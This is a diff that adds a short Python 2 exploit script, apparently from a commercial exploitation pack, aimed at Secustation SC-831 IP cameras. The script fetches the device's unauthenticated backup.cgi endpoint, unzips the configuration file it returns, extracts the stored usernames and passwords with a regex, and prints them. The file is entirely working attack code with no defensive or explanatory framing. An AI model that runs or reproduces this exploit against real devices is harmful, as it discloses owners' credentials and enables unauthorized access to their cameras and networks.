@@ -1,0 +1,54 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+import urllib3
+import StringIO
+import gzip
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+_name_   = 'd2sec_secustation_1'
+_vendor_ = 'secustation'
+_model_  = ['SC-831']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://0day.today/exploit/34004'
+_port_   = 8083
+
+def pwnrouter(host,port=_port_):
+  try:
+    username = ''
+    password = ''
+    url = 'http://%s:%d' % (host,port)
+    response = requests.get(url+'/web/cgi-bin/hi3510/backup.cgi')
+    if response is None:
+      print '[+] %s not vulnerable' % host        
+    compressedFile = StringIO.StringIO()
+    compressedFile.write(response.content)
+    compressedFile.seek(0)
+    decompressedFile = gzip.GzipFile(fileobj=compressedFile, mode='rb')
+    config = decompressedFile.read()    
+    m = re.findall('username\s*=\s*(.+)\s*password\s*=\s*(.+)', config)
+    if m is None:
+        print '[+] %s not vulnerable' % host
+        return            
+    print '[+] %s vulnerable\n' % host    
+    for n in m:        
+        print 'Username: %s\nPassword: %s\n'%(n[0].replace('"', ""),n[1].replace('"', ""))
+  except Exception, e:
+    print '[-] error : %s' % e
+    return    
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
